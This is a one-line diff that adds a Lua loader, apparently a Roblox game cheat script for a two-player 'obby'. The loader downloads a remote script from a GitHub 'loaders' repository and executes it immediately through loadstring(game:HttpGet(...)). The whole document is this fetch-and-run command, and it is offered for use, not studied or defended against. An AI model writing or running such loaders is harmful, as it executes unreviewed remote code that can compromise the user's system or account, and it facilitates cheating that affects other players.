@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/carry-the-glass-together-2-player-obby-spam3-59f847s9o8m4u8.lua"))()
